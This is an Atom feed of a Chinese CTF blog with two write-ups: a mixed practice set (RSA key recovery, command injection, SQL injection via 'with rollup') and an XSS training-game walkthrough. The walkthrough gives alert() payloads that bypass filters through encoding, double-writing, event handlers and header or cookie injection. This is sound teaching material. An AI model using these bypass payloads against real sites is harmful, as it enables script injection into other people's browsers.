<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>0verWatch&#39;s Blog</title>
  
  <subtitle>学习本无底，前进莫彷徨</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="0verwatch.top/"/>
  <updated>2019-03-31T08:50:41.560Z</updated>
  <id>0verwatch.top/</id>
  
  <author>
    <name>0verWatch</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>周周练西湖论剑特别版(部分wp)</title>
    <link href="0verwatch.top/week-practice-anheng.html"/>
    <id>0verwatch.top/week-practice-anheng.html</id>
    <published>2019-03-31T08:47:32.000Z</published>
    <updated>2019-03-31T08:50:41.560Z</updated>
    
    <content type="html"><![CDATA[<p>复习数学复习到吐，结果又说推迟一个月再考试，实在对数学提不了兴趣就刷刷题，又来水一篇博客<a id="more"></a>    </p><h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="qr"><a href="#qr" class="headerlink" title="qr"></a>qr</h4><p>这个题扫个二维码就行了</p><h4 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h4><p>这个题目说管理员登陆的密码就是flag，那么我们可以导出http对象看一下发现这几个可疑的url</p><p><a href="https://imgchr.com/i/AruUIO" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/31/AruUIO.png" alt="AruUIO.png"></a></p><p>点击大小为7266字节的那个包然后追踪流就会发现，里面有一个password关键字，这个就是flag</p><p><img src="https://s2.ax1x.com/2019/03/31/ArussI.png" alt="ArussI.png"></p><h4 id="百里挑一"><a href="#百里挑一" class="headerlink" title="百里挑一"></a>百里挑一</h4><p>我记得这个以前做过，好像是要写个脚本把里面的图片筛选出来，太耗神没时间不做了，导了一下图片，418张。。。</p><p><img src="https://s2.ax1x.com/2019/03/31/AruIQs.png" alt="AruIQs.png"></p><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="Ordinary-keyboard"><a href="#Ordinary-keyboard" class="headerlink" title="Ordinary keyboard"></a>Ordinary keyboard</h4><p>不清楚题目跟keyboard有什么关系，反正我只能从题目中了解到几个字母的对应关系，反正数字是不变的。。还是留点脑子想高数吧，这脑洞真的不适合我</p><h4 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h4><p>正常类型的题目，给了你公钥，先用openssl把n，e导出来</p><p><img src="https://s2.ax1x.com/2019/03/31/ArK1k8.png" alt="ArK1k8.png"></p><p>然后转十进制n分解</p><p><img src="https://s2.ax1x.com/2019/03/31/ArKamq.png" alt="ArKamq.png"></p><p><img src="https://s2.ax1x.com/2019/03/31/ArKw7V.png" alt="ArKw7V.png"></p><p>搞个代码写个私钥</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line">arsa=RSA.generate(<span class="number">1024</span>)</span><br><span class="line">arsa.p=<span class="number">285960468890451637935629440372639283459</span></span><br><span class="line">arsa.q=<span class="number">304008741604601924494328155975272418463</span></span><br><span class="line">arsa.e=<span class="number">65537</span></span><br><span class="line">arsa.n=arsa.p*arsa.q</span><br><span class="line">Fn=long((arsa.p<span class="number">-1</span>)*(arsa.q<span class="number">-1</span>))</span><br><span class="line"></span><br><span class="line">i=<span class="number">1</span></span><br><span class="line"><span class="keyword">while</span>(<span class="keyword">True</span>):</span><br><span class="line">    x=(Fn*i)+<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span>(x%arsa.e==<span class="number">0</span>):</span><br><span class="line">           arsa.d=x/arsa.e</span><br><span class="line">           <span class="keyword">break</span></span><br><span class="line">    i=i+<span class="number">1</span></span><br><span class="line">private=open(<span class="string">'private.pem'</span>,<span class="string">'w'</span>)</span><br><span class="line">private.write(arsa.exportKey())</span><br><span class="line">private.close()</span><br></pre></td></tr></table></figure><p>解密得到flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rsautl -decrypt -<span class="keyword">in</span> flag.enc -inkey private.pem -out flag.dec</span><br></pre></td></tr></table></figure><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="WebScan"><a href="#WebScan" class="headerlink" title="WebScan"></a>WebScan</h4><p>这个题目都做了很多遍了，这里根据题意可以去读一下apache的相关配置文件，这里是读取<code>/etc/httpd/conf/httpd.conf</code>，直接就出来flag了</p><p><img src="https://s2.ax1x.com/2019/03/31/ArM93Q.png" alt="ArM93Q.png"></p><h4 id="刀塔"><a href="#刀塔" class="headerlink" title="刀塔"></a>刀塔</h4><p>有一个flag文件，绝对是想考察读取文件，看到还有几个注入参数，一开始以为是SQL注入读文件，但是首先得绕过，因为他对过滤的字符回显<code>Illegal operation!</code>，然后fuzz一下看过滤了哪些字符，就突然出现flag了。。这是来搞笑的？(黑人问号)</p><p><img src="https://s2.ax1x.com/2019/03/31/ArML24.png" alt="ArML24.png"></p><p>然后回过头来看看这个出题人想干啥，发现这个目录下还存在一个<a href="http://www.zip文件，可以直接下载下来，也可以看到flag。。。。这出题还有什么意义？再想想应该是出题人应该是忘记把flag文件忘记删额。。因为我看了下index的源码，他想考察的应该是命令执行的绕过，通配符之类的，因为他不允许出现字母并且有长度限制。。" target="_blank" rel="noopener">www.zip文件，可以直接下载下来，也可以看到flag。。。。这出题还有什么意义？再想想应该是出题人应该是忘记把flag文件忘记删额。。因为我看了下index的源码，他想考察的应该是命令执行的绕过，通配符之类的，因为他不允许出现字母并且有长度限制。。</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'nid'</span>]))&#123;</span><br><span class="line"></span><br><span class="line">               <span class="keyword">if</span>(preg_match(<span class="string">"/[a-zA-Z]/"</span>,$_GET[<span class="string">'nid'</span>]))&#123;</span><br><span class="line">                  <span class="keyword">exit</span>(<span class="string">"Illegal operation!"</span>);</span><br><span class="line">               &#125;<span class="keyword">elseif</span>(strlen($_GET[nid])&gt;<span class="number">5</span>)&#123;</span><br><span class="line">                  <span class="keyword">exit</span>(<span class="string">"Illegal operation!"</span>);</span><br><span class="line">               &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                  <span class="keyword">echo</span> <span class="string">"&lt;p class=lead&gt;"</span>;</span><br><span class="line">                  system(<span class="string">"head ./news/"</span> . $_GET[<span class="string">'nid'</span>]);</span><br><span class="line">                  <span class="keyword">echo</span> <span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这个题目质量不高。。。</p><h4 id="美男子"><a href="#美男子" class="headerlink" title="美男子"></a>美男子</h4><p>这个题目一上来查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'global.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">AttackFilter</span><span class="params">($StrKey,$StrValue,$ArrReq)</span></span>&#123;  </span><br><span class="line">    <span class="keyword">if</span>(is_array($StrValue))</span><br><span class="line">    &#123;</span><br><span class="line">        $StrValue=implode($StrValue);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/"</span>.$ArrReq.<span class="string">"/is"</span>,$StrtValue)==<span class="number">1</span>)&#123;   </span><br><span class="line">        <span class="keyword">print</span> <span class="string">"holy shit!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;      </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">$filter = <span class="string">"union|select|from|where|join|sleep|benchmark|,|\(|\)"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $key=&gt;$value)&#123; </span><br><span class="line">    AttackFilter($key,$value,$filter);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_POST[<span class="string">'key1'</span>]) || !<span class="keyword">isset</span>($_POST[<span class="string">'key2'</span>])) &#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&lt;&lt;&lt;DBAPP</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;img src='image/img.jpg' /&gt;</span></span><br><span class="line"><span class="string">&lt;!--index.phps--&gt;</span></span><br><span class="line"><span class="string">DBAPP;</span></span><br><span class="line">    <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$query = mysql_query(<span class="string">"SELECT * FROM tb_ctf WHERE key1 = '&#123;$_POST['key1']&#125;'"</span>); </span><br><span class="line"><span class="keyword">if</span>(mysql_num_rows($query) == <span class="number">1</span>) &#123; </span><br><span class="line">    $key = mysql_fetch_array($query);</span><br><span class="line">    <span class="keyword">if</span>($key[<span class="string">'key2'</span>] == $_POST[<span class="string">'key2'</span>]) &#123;</span><br><span class="line">        <span class="keyword">print</span> $flag;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Error!"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Error!"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>左看右看发现这小过滤有点熟悉，这根本就是实验吧上面的原题好吧。。。考察的是with rollup的特性，以下图为例，根据pass这一列分组使用with rollup之后会产生一组属性为NULL的值，这也是为什么key2位NULL的原因</p><p><img src="https://s2.ax1x.com/2019/03/31/ArQGss.png" alt="ArQGss.png"></p><p>这里首先得绕过<code>mysql_num_rows($query) == 1</code>的判断，这很容易直接使用<code>or</code>就行使其恒成立，就会显示<code>Error</code>说明我们已经成功进入判断了</p><p>但是我们不知道数据库里面有多少数据，不知道哪一条是NULL，我们可以使用<code>limit offset</code>去一条条测试就好，根据我的payload来看这数据库本应该就一条数据。</p><p><img src="https://s2.ax1x.com/2019/03/31/ArQBz4.png" alt="ArQBz4.png"></p><p>就写到这里把，纯粹就是想逃离一下刷高数的恐惧2333333</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;复习数学复习到吐，结果又说推迟一个月再考试，实在对数学提不了兴趣就刷刷题，又来水一篇博客
    
    </summary>
    
      <category term="CTF" scheme="0verwatch.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="0verwatch.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>xss游戏通关笔记</title>
    <link href="0verwatch.top/xss-game.html"/>
    <id>0verwatch.top/xss-game.html</id>
    <published>2019-03-11T10:59:33.000Z</published>
    <updated>2019-03-11T11:02:53.998Z</updated>
    
    <content type="html"><![CDATA[<p>最近在练习xss，感觉这个游戏挺适合新手的，从代码层角度分析更加深刻认识xss的形成，<a id="more"></a>写了一下通关攻略，并附上了xss漏洞使用工具如何去fuzz。代码分享：链接: <a href="https://pan.baidu.com/s/12b_E1PtgUH0b93qupJ7IvQ" target="_blank" rel="noopener">https://pan.baidu.com/s/12b_E1PtgUH0b93qupJ7IvQ</a> 提取码: 2333</p><h3 id="level-1"><a href="#level-1" class="headerlink" title="level-1"></a>level-1</h3><p>这个题目发现url中有一个参数name可控，立刻用<code>&lt;script&gt;alert(1);&lt;/script&gt;</code>测试测试一下，弹窗成功，在xss中拥有同样弹窗效果的函数不止<code>alert</code>，还有<code>confirm</code>以及<code>prompt</code></p><p><img src="https://s2.ax1x.com/2019/03/05/kXHE8A.png" alt="kXHE8A.png"></p><p>从代码角度去看，可以发现就是直接用GET方式获取参数然后输出到浏览器上面，这是典型的没做过滤。怎么防御？可以加一个转义函数<code>htmlspecialchars</code>把一些html格式的东西编码就可以有效防止了。</p><p><img src="https://s2.ax1x.com/2019/03/05/kXHmKP.png" alt="kXHmKP.png"></p><h3 id="level-2"><a href="#level-2" class="headerlink" title="level-2"></a>level-2</h3><p>同样的发现url中<code>keyword</code>参数可控，尝试探测一波，但是发现被转义了</p><p><img src="https://s2.ax1x.com/2019/03/05/kXXbE6.png" alt="kXXbE6.png"></p><p>猜测应该是使用了我上面所讲的函数，查看一下代码</p><p><img src="https://s2.ax1x.com/2019/03/05/kXOvmq.png" alt="kXOvmq.png"></p><p>我们发现只有一处是使用了这个转义函数的，还有一处没有进行过滤，在input标签里面，我们可以尝试去闭合input标签，构造payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(123);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>弹窗成功</p><p><img src="https://s2.ax1x.com/2019/03/05/kXX6H0.png" alt="kXX6H0.png"></p><h3 id="level-3"><a href="#level-3" class="headerlink" title="level-3"></a>level-3</h3><p>同样先测试一下看看哪里是输入点，哪里是输出点</p><p><img src="https://s2.ax1x.com/2019/03/05/kXjqLn.png" alt="kXjqLn.png"></p><p>然后再用最简单的语句<code>&lt;script&gt;alert(123);&lt;/script&gt;</code>尝试一下，发现尖括号被转义了，而且刚才利用的点也被转义了</p><p><img src="https://s2.ax1x.com/2019/03/05/kXvpz4.png" alt="kXvpz4.png"></p><p>观察一下源码是怎样过滤的，很明显两处都存在过滤函数</p><p><img src="https://s2.ax1x.com/2019/03/05/kXvKQH.png" alt="kXvKQH.png"></p><p>但是这个函数有一点就是，默认配置是不过滤单引号的。只有设置了：         <code>ENT_QUOTES</code>，才可以转义单引号，所以这关的value值是刚好给了这样的一个机会去闭合。</p><p><img src="https://s2.ax1x.com/2019/03/05/kXvBmn.png" alt="kXvBmn.png"></p><p>所以可以构建payload，这次由于弹窗内容在尖括号内，可以使用事件去弹窗，这里介绍几个常用的事件函数，比如<code>onchange, onclick, oninput</code>等等，这里我使用<code>onchange</code>去实现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;onchange=alert`123` &apos;</span><br></pre></td></tr></table></figure><p>弹窗成功</p><p><img src="https://s2.ax1x.com/2019/03/05/kXxKhT.png" alt="kXxKhT.png"></p><h3 id="level-4"><a href="#level-4" class="headerlink" title="level-4"></a>level-4</h3><p>同样的方法，先用<code>&lt;script&gt;alert(123);&lt;/script&gt;</code>尝试一下，发现标题处是经过了转义，但是在input标签内只是过滤了尖括号，可以怀疑此处是否出现使用黑名单的过滤。</p><p><img src="https://s2.ax1x.com/2019/03/05/kXxa4K.png" alt="kXxa4K.png"></p><p>看一下代码，证实一下思路，发现确实如此，但是这里我们仍然可以使用事件去触发弹窗，这样就避免使用了尖括号了。</p><p><img src="https://s2.ax1x.com/2019/03/05/kXxh8S.png" alt="kXxh8S.png"></p><p>这里注意一下，跟上一题明显不同，这里需要使用双引号闭合，构造对应的payload，然后使用对应的注释符把后面的双引号给注释掉：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onclick=alert `123` //</span><br></pre></td></tr></table></figure><h3 id="level-5"><a href="#level-5" class="headerlink" title="level-5"></a>level-5</h3><p>还是原来的测试手段，标题处的输出经过转义没啥利用，但是在input标签内你会发现测试的script标签被变成其他的东西，这就很有可能又是一个替换，再用上一关的payload去试试，你会发现on变成了o_n，相当于加了一个下划线，这就限制了我们使用事件以及标签了。</p><p><img src="https://s2.ax1x.com/2019/03/05/kjSz7R.png" alt="kjSz7R.png"></p><p>查看一下源码，果然源码对<code>&lt;script</code>以及<code>on</code>做了过滤。</p><p><img src="https://s2.ax1x.com/2019/03/05/kjpXPP.png" alt="kjpXPP.png"></p><p>这里可以使用<code>&lt;a&gt;</code>标签去实现弹窗的调用，这不存在on或者script等关键字，还使用了<code>javascript:alert(&#39;xss&#39;)</code>去调用了JavaScript的函数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;a href=&quot;javascript:alert(&apos;123&apos;)&quot;&gt;dian&lt;/a&gt; //</span><br></pre></td></tr></table></figure><p>后面点击就会产生弹窗了</p><p><img src="https://s2.ax1x.com/2019/03/05/kjiprD.png" alt="kjiprD.png"></p><p>实际上这题还可以大写绕过的。</p><h3 id="level-6"><a href="#level-6" class="headerlink" title="level-6"></a>level-6</h3><p>同样的，输入&lt;script和on都会被加上下划线，再尝试上面的payload会发现连href都被替换了，这样有可能是黑名单增加了。</p><p><img src="https://s2.ax1x.com/2019/03/05/kjiAPI.png" alt="kjiAPI.png"></p><p>观察一下代码可以发现，对于黑名单里面的数量确实增多了，但也不影响，我们可以使用大 小写去实现绕过，可以构造下面的 payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;Script&gt;alert(&apos;123&apos;)&lt;/script&gt; //</span><br><span class="line">&quot;&gt;&lt;a Href=&quot;javascript:alert(123)&quot;&gt;dian&lt;/a&gt;//</span><br></pre></td></tr></table></figure><h3 id="level-7"><a href="#level-7" class="headerlink" title="level-7"></a>level-7</h3><p>输入的测试代码会发现里面的关键字被置换为空，这很明显就是直接将某些关键字变成空字符</p><p><img src="https://s2.ax1x.com/2019/03/05/kjA0oQ.png" alt="kjA0oQ.png"></p><p>看一下代码，可以发现确实是把关键字变成了空字符。</p><p><img src="https://s2.ax1x.com/2019/03/05/kjAsWn.png" alt="kjAsWn.png"></p><p>这里就用到一个SQL注入里面经常用到的技巧，双写绕过，构造payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;scrscriptipt&gt;alert(123);&lt;/scrscriptipt&gt;</span><br></pre></td></tr></table></figure><p>同样的对on，src，data，href双写也可以实现同样的而效果</p><h3 id="level-8"><a href="#level-8" class="headerlink" title="level-8"></a>level-8</h3><p>分析一下代码，可以发现，这次的过滤比前面的好几关都要严格，不仅做了过滤，而且还对<code>input</code>标签里面的内容使用<code>htmlspecialchars</code>函数转义了。但是可以发现还有一处调用的字符串里面没有使用这样的函数去进行防护，可以利用这一点下功夫</p><p><img src="https://s2.ax1x.com/2019/03/07/kxcjsg.png" alt="kxcjsg.png"></p><p>那么该如何利用呢？这里只是过滤了关键字。但是可以使用HTML编码进行绕过，HTML编码的存在就是让他在代码中和显示中分开， 避免错误。推荐一个编码网站：<a href="https://www.qqxiuzi.cn/bianma/zifushiti.php" target="_blank" rel="noopener">https://www.qqxiuzi.cn/bianma/zifushiti.php</a></p><p>值得注意的是浏览器如果要把HTML编码解析并且渲染前提必须要这种编码一定要在标签内某个属性里面才行。如：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">"&amp;#104;&amp;#101;&amp;#108;&amp;#108;&amp;#111;"</span> &gt;click&lt;<span class="regexp">/a&gt;</span></span><br></pre></td></tr></table></figure><p>但是里如果你把href也编码的话，这就无法正常渲染了</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a &amp;#104;&amp;#114;&amp;#101;&amp;#102;="&amp;#104;&amp;#101;&amp;#108;&amp;#108;&amp;#111;" &gt;click&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>所以这里可以参考上一关的payload，利用协议去绕过，利用a标签，修改里面的属性值即可，只是script这个关键字得转义一部分才行，如下</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javasc&amp;#x72;ipt:alert(123)</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/03/07/kx24UA.png" alt="kx24UA.png"></p><h3 id="level-9"><a href="#level-9" class="headerlink" title="level-9"></a>level-9</h3><p>从代码角度上看，只是增加了对于url的判断，其实对这一关没有太大影响</p><p><img src="https://s2.ax1x.com/2019/03/07/kxRVa9.png" alt="kxRVa9.png"></p><p>为什么这样说？在代码里面没啥影响的部分就是注释了，在某些挖掘漏洞的过程中使用注释往往可以起到意想不到的效果，这里可以在注释里面插入关键字</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascri&amp;#x0070;t:alert(1)/*http://x.x.x.x*/</span><br></pre></td></tr></table></figure><p>当然如果单单为了弹窗，这样也行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascri&amp;#x0070;t:alert(&quot;http://&quot;)</span><br></pre></td></tr></table></figure><h3 id="level-10"><a href="#level-10" class="headerlink" title="level-10"></a>level-10</h3><p>随手测试了弹窗语句，发现被转义了，但是发现了3个隐藏参数，有点蹊跷</p><p><img src="https://s2.ax1x.com/2019/03/07/kxRIZ4.png" alt="kxRIZ4.png"></p><p>来分析一下源代码，发现keyword参数经过了<code>htmlspecialchars</code>函数的防护而且是以双引号拼接的，所以这里的利用价值很低，但发现另外一个t_sort参数，但是这个参数经过了过了尖括号的过滤，最后输出到其中一个隐藏的input标签内</p><p><img src="https://s2.ax1x.com/2019/03/07/kxWSdH.png" alt="kxWSdH.png"></p><p>虽然过滤了尖括号，但可以闭合双引号，使用<code>onclick</code>事件，然后把隐藏的标签用<code>text</code>方式回显出来即可，最后的payload</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">t_sort=<span class="string">" onclick="</span>alert(<span class="number">123</span>)<span class="string">" type="</span>text<span class="string">" "</span><span class="string">"</span></span><br></pre></td></tr></table></figure><h3 id="level-11"><a href="#level-11" class="headerlink" title="level-11"></a>level-11</h3><p>同样的情况明显的输出点被转义，但是存在几个隐藏的input标签，同样的观察一下代码，发现刚才利用的地方全都加上了防护，但是多出的一个标签内直接输出$str33，往回找这个变量来自哪里，发现来自http头，所以思路很明确，伪造http头部信息即可。</p><p><img src="https://s2.ax1x.com/2019/03/07/kxWwf1.png" alt="kxWwf1.png"></p><p>抓个包修改里面的<code>HTTP_REFERER</code>参数，payload也是原来的payload，因为这里的输出点的过滤跟上一关一样，也是过滤了尖括号，但无所谓用双引号闭合即可</p><p><img src="https://s2.ax1x.com/2019/03/08/kz6bOe.png" alt="kz6bOe.png"></p><h3 id="level-12"><a href="#level-12" class="headerlink" title="level-12"></a>level-12</h3><p>同样的，观察代码，发现这题跟上面的题目类似，利用的输出点在<code>$str33</code>这个变量上，只是这一次修改的头部信息不一样了，可以发现这次的头部信息是<code>HTTP_USER_AGENT</code></p><p><img src="https://s2.ax1x.com/2019/03/08/kzgbad.png" alt="kzgbad.png"></p><p>类似的payload，抓包发包即可</p><p><img src="https://s2.ax1x.com/2019/03/08/kzRPOO.png" alt="kzRPOO.png"></p><h3 id="level-13"><a href="#level-13" class="headerlink" title="level-13"></a>level-13</h3><p>分析一下源码，发现这一次不是从http头下功夫了，而是从cookie这一点入手了，可以看到代码里面首先对cookie进行一个初始值的设置，然后经过了两次的过滤，最后通过$str33这个变量输出。</p><p><img src="https://s2.ax1x.com/2019/03/08/kzfmsf.png" alt="kzfmsf.png"></p><p>因为过滤和输出点没有任何变化，所以利用方式还是上一关的方式，只是输入点变了而已，这次从cookie中的user变量进行输入，同样的payload：<code>&quot; onclick=&quot;alert(123)&quot;  type=&quot;text&quot; &quot;</code>，抓包改包即可</p><p><img src="https://s2.ax1x.com/2019/03/08/kzhC60.png" alt="kzhC60.png"></p><h3 id="level-14"><a href="#level-14" class="headerlink" title="level-14"></a>level-14</h3><p>这一关利用了图片exif的属性，经过上传之后可以利用里面的属性去触发xss漏洞，可惜没环境。直接跳到下一关吧</p><h3 id="level-15"><a href="#level-15" class="headerlink" title="level-15"></a>level-15</h3><p>观察源码，可以发现输出点用函数做了防护，而且比起前面几关多了很多不同点。</p><p><img src="https://s2.ax1x.com/2019/03/08/kz4u5Q.png" alt="kz4u5Q.png"></p><p>这里包含了angular js的脚本，并且使用了它的相关类:<code>ng-include</code>，百度可知这是一个有文件包含功能的类。</p><p><img src="https://s2.ax1x.com/2019/03/08/kz4jRs.png" alt="kz4jRs.png"></p><p>这样的话，思路就出来了，这个页面没利用点，但是利用另外一个存在漏洞的页面不就可以了吗？因为这里使用了函数防护，出现尖括号的东西很有可能会被转义，这里我们选择通过闭合产生xss漏洞的文件进行包含，选择level-2。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">src=&apos;level2.php?keyword=&quot; onclick=&quot;alert(123)&quot; &quot;&apos;</span><br></pre></td></tr></table></figure><p>弹窗成功</p><p><img src="https://s2.ax1x.com/2019/03/08/kzomVK.png" alt="kzomVK.png"></p><h3 id="level-16"><a href="#level-16" class="headerlink" title="level-16"></a>level-16</h3><p>查看第16关的代码，发现输入的东西经过了大小写的转换并且通过四次的替换检查，分别对script，空格，/，进行了替换，但是有一点很重要，尖括号没有被替换，这给我们留下很大的利用空间。</p><p><img src="https://s2.ax1x.com/2019/03/08/kzoGrt.png" alt="kzoGrt.png"></p><p>另外script被替代，我们可以使用img标签，剩下我们就需要考虑如何把空格的影响给去掉，这时候就需要使用编码来进行绕过了，可以选择<code>%0d</code> <code>%0a</code> 进行绕过，构造出最后的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img%0dsrc=1%0donerror=&quot;alert(123)&quot;&gt;</span><br></pre></td></tr></table></figure><p>成功弹窗</p><p><img src="https://s2.ax1x.com/2019/03/08/kzoOiD.png" alt="kzoOiD.png"></p><h3 id="level-17"><a href="#level-17" class="headerlink" title="level-17"></a>level-17</h3><p>分析一下代码，发现输出点都进行了防护，对尖括号以及双引号进行了转义，但是不影响我们利用。</p><p><img src="https://s2.ax1x.com/2019/03/08/kzbrfU.png" alt="kzbrfU.png"></p><p><code>&lt;embed&gt;</code>标签定义嵌入的内容，比如插件，所以这里我们可以使用on事件去进行触发，但是首先得用b去闭合前面的等号，构造payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arg02=b onclick=alert(1)</span><br></pre></td></tr></table></figure><p>成功弹窗</p><p><img src="https://s2.ax1x.com/2019/03/08/kzq64f.png" alt="kzq64f.png"></p><p>查看输出验证一下思路</p><p><img src="https://s2.ax1x.com/2019/03/08/kzqBDA.png" alt="kzqBDA.png"></p><h3 id="level-18"><a href="#level-18" class="headerlink" title="level-18"></a>level-18</h3><p>跟上面那一个题目没有啥区别，一样的操作。。</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/xss/level18.php?arg01=a&amp;arg02=b%20onmouseout=alert(1)</span><br></pre></td></tr></table></figure><p>直接弹窗</p><p><img src="https://s2.ax1x.com/2019/03/08/kzLZqA.png" alt="kzLZqA.png"></p><p>看看输出，跟上一关差不多</p><p><img src="https://s2.ax1x.com/2019/03/08/kzLGrj.png" alt="kzLGrj.png"></p><p>上面的游戏都是直接看源代码才发觉到哪里有漏洞，那么肯定问题来了，如果不给源码的情况下该怎样去测试呢？因为在现实渗透中我们需要一个个payload测试是很麻烦的</p><p>这里我提供一种比较大众一点的fuzz技巧。利用burpsuit自动化xss</p><p>首先我们得在burpsuit的Extender模块中下载对应的<code>XSS Validator</code>插件</p><p><img src="https://s2.ax1x.com/2019/03/08/kzjkxU.png" alt="kzjkxU.png"></p><p>安装成功后可以发现菜单栏上会多一栏你插件的名字</p><p><img src="https://s2.ax1x.com/2019/03/08/kzORmj.png" 